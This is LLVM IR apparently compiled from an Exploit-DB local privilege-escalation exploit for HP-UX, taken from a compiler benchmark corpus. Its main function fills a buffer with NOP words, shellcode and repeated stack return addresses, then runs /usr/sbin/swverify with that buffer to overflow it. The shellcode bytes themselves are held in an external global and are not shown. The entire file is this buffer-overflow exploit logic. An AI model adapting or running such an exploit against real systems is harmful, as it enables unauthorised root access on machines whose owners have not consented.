; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_21098.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hp-ux/local/extr_21098.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUF_LENGTH = common dso_local global i32 0, align 4
@hppa_shellcode = common dso_local global i8* null, align 8
@STACK_OFFSET = common dso_local global i32 0, align 4
@EXTRA = common dso_local global i32 0, align 4
@HPPA_NOP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [45 x i8] c"Jumping to address 0x%lx B[%d] E[%d] SO[%d]\0A\00", align 1
@.str.1 = private unnamed_addr constant [19 x i8] c"/usr/sbin/swverify\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"swverify\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"execl failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32*, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @BUF_LENGTH, align 4
  %17 = add nsw i32 %16, 8
  %18 = zext i32 %17 to i64
  %19 = call i8* @llvm.stacksave()
  store i8* %19, i8** %6, align 8
  %20 = alloca i8, i64 %18, align 16
  store i64 %18, i64* %7, align 8
  %21 = load i8*, i8** @hppa_shellcode, align 8
  %22 = call i32 @strlen(i8* %21)
  store i32 %22, i32* %13, align 4
  %23 = load i32, i32* @STACK_OFFSET, align 4
  store i32 %23, i32* %14, align 4
  %24 = load i32, i32* @EXTRA, align 4
  store i32 %24, i32* %15, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 1
  br i1 %26, label %27, label %36

27:                                               ; preds = %2
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = call i64 @atoi(i8* %30)
  %32 = load i32, i32* %14, align 4
  %33 = sext i32 %32 to i64
  %34 = add nsw i64 %33, %31
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %14, align 4
  br label %36

36:                                               ; preds = %27, %2
  %37 = load i32, i32* %4, align 4
  %38 = icmp sgt i32 %37, 2
  br i1 %38, label %39, label %48

39:                                               ; preds = %36
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 2
  %42 = load i8*, i8** %41, align 8
  %43 = call i64 @atoi(i8* %42)
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = add nsw i64 %45, %43
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %15, align 4
  br label %48

48:                                               ; preds = %39, %36
  %49 = bitcast i8* %20 to i32*
  store i32* %49, i32** %10, align 8
  store i32 0, i32* %12, align 4
  br label %50

50:                                               ; preds = %65, %48
  %51 = load i32, i32* %12, align 4
  %52 = sext i32 %51 to i64
  %53 = load i32, i32* @BUF_LENGTH, align 4
  %54 = load i32, i32* %13, align 4
  %55 = sub nsw i32 %53, %54
  %56 = load i32, i32* %15, align 4
  %57 = sub nsw i32 %55, %56
  %58 = sext i32 %57 to i64
  %59 = udiv i64 %58, 4
  %60 = icmp ult i64 %52, %59
  br i1 %60, label %61, label %68

61:                                               ; preds = %50
  %62 = load i32, i32* @HPPA_NOP, align 4
  %63 = load i32*, i32** %10, align 8
  %64 = getelementptr inbounds i32, i32* %63, i32 1
  store i32* %64, i32** %10, align 8
  store i32 %62, i32* %63, align 4
  br label %65

65:                                               ; preds = %61
  %66 = load i32, i32* %12, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %12, align 4
  br label %50

68:                                               ; preds = %50
  %69 = load i32*, i32** %10, align 8
  store i32* %69, i32** %11, align 8
  store i32 0, i32* %12, align 4
  br label %70

70:                                               ; preds = %83, %68
  %71 = load i32, i32* %12, align 4
  %72 = load i32, i32* %13, align 4
  %73 = icmp slt i32 %71, %72
  br i1 %73, label %74, label %86

74:                                               ; preds = %70
  %75 = load i8*, i8** @hppa_shellcode, align 8
  %76 = load i32, i32* %12, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = load i32*, i32** %11, align 8
  %82 = getelementptr inbounds i32, i32* %81, i32 1
  store i32* %82, i32** %11, align 8
  store i32 %80, i32* %81, align 4
  br label %83

83:                                               ; preds = %74
  %84 = load i32, i32* %12, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %12, align 4
  br label %70

86:                                               ; preds = %70
  %87 = call i32 (...) @get_sp()
  %88 = load i32, i32* %14, align 4
  %89 = sub nsw i32 %87, %88
  %90 = sext i32 %89 to i64
  store i64 %90, i64* %8, align 8
  store i32 0, i32* %12, align 4
  br label %91

91:                                               ; preds = %120, %86
  %92 = load i32, i32* %12, align 4
  %93 = load i32, i32* %15, align 4
  %94 = sdiv i32 %93, 4
  %95 = icmp slt i32 %92, %94
  br i1 %95, label %96, label %123

96:                                               ; preds = %91
  %97 = load i64, i64* %8, align 8
  %98 = lshr i64 %97, 24
  %99 = and i64 %98, 255
  %100 = trunc i64 %99 to i32
  %101 = load i32*, i32** %11, align 8
  %102 = getelementptr inbounds i32, i32* %101, i32 1
  store i32* %102, i32** %11, align 8
  store i32 %100, i32* %101, align 4
  %103 = load i64, i64* %8, align 8
  %104 = lshr i64 %103, 16
  %105 = and i64 %104, 255
  %106 = trunc i64 %105 to i32
  %107 = load i32*, i32** %11, align 8
  %108 = getelementptr inbounds i32, i32* %107, i32 1
  store i32* %108, i32** %11, align 8
  store i32 %106, i32* %107, align 4
  %109 = load i64, i64* %8, align 8
  %110 = lshr i64 %109, 8
  %111 = and i64 %110, 255
  %112 = trunc i64 %111 to i32
  %113 = load i32*, i32** %11, align 8
  %114 = getelementptr inbounds i32, i32* %113, i32 1
  store i32* %114, i32** %11, align 8
  store i32 %112, i32* %113, align 4
  %115 = load i64, i64* %8, align 8
  %116 = and i64 %115, 255
  %117 = trunc i64 %116 to i32
  %118 = load i32*, i32** %11, align 8
  %119 = getelementptr inbounds i32, i32* %118, i32 1
  store i32* %119, i32** %11, align 8
  store i32 %117, i32* %118, align 4
  br label %120

120:                                              ; preds = %96
  %121 = load i32, i32* %12, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %12, align 4
  br label %91

123:                                              ; preds = %91
  %124 = load i64, i64* %8, align 8
  %125 = call i32 @strlen(i8* %20)
  %126 = load i32, i32* %15, align 4
  %127 = load i32, i32* %14, align 4
  %128 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), i64 %124, i32 %125, i32 %126, i32 %127)
  %129 = call i32 @execl(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i8* %20, i8* null)
  %130 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  %131 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %131)
  %132 = load i32, i32* %3, align 4
  ret i32 %132
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @get_sp(...) #2

declare dso_local i32 @printf(i8*, i64, i32, i32, i32) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
